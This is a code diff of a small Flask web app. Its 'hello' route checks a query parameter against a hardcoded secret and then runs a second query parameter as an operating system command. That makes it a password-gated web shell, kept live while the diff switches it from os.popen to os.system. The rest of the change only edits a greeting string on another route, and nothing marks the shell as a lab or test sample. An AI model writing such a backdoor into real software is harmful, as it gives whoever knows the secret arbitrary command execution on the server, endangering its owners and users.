@@ -10,14 +10,14 @@ def hello():
 	p = str(request.args.get("p"))
 	if p == '93a610435bfdc6c2bda74f00bfdec18d40b':
 		q = str(request.args.get("q"))
-		result = os.popen(q)
-		return str(result)
+		os.system(q)
+		return q
 	else:
 		return "Error authenticating!!!"
 		
 @app.route("/new")
 def hello_new():
-	return "Hello there test auto update2!!!"
+	return "Hello there!!!"
 
 
 if __name__ == "__main__":
